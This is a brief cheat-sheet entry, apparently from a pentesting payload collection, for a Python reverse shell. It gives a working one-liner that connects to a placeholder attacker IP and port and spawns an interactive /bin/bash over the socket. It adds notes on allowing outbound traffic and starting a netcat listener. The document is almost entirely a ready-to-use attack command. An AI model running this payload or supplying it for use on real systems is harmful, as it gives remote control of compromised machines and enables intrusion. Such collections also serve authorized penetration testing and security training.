---
payload_type: "Reverse Shell"
language: "Python"
tags: [payload/reverse-shell/python]
date: 2024-12-15
---
# Python Reverse Shell
## Command
```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Notes

- Ensure firewall allows outbound connections.
- Use netcat listener: `nc -lvnp port`.
